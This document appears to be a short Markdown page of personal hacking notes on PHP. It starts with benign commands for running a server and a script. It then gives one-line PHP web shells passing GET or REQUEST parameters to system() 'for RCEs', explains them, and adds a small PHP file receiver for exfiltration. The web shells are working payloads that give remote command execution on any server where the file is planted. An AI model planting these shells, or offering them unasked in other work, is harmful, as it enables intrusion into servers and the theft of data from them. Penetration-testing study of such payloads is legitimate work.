# Useful_PHP

[RTFM here is a documentation](https://www.php.net/) below is just useful php with description how its workings

PHP webserver
```bash
php -S 0.0.0.0:8000
```

Execute file:
```bash
php file.php
```

## Scripting

Http `cmd` super global variable function for RCEs  
```php
<?php system($_GET['cmd']); ?>
```
`<?php` is the script tag, `system()`is the function call, `$_GET` is a reserved(in standard libvrary) [superglobal variable for HTTP GET](https://www.php.net/manual/en/reserved.variables.get.php), `['cmd']` ,`;` is line terminating character and finally `?>` is the closing script tag. 

```php
<?php system($_REQUEST['cmd']); ?>
```


phpinfo displayer
```PHP
<?php echo("Hello");phpinfo(); ?>
```

Base64 PHP decoder
```PHP
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

## Vulnerable Functions
[[Vulnerable-PHP-Functions]]

## Webserver Exfiltratation

Curl post data to the webserver to then login to exfiltrate
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```


## References

[HTTP GET superglobal variable](https://www.php.net/manual/en/reserved.variables.get.php)
[php.net](https://www.php.net/) 
